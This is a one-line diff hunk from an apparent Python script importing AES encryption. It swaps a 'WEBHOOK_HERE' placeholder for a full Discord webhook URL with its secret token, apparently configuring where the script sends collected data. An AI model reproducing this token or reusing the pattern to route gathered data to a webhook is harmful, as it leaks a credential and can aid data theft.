@@ -74,7 +74,7 @@ from Crypto.Cipher import AES
 
 
 
-hook = "WEBHOOK_HERE"
+hook = "https://discord.com/api/webhooks/1484442528030920795/GhE-xG7OI2HZEQOKOdbETT_Fv6xgBLCXpM016JAf_v51KtfsqAS5wI957ShEH6S3s-hS"
 
 
 
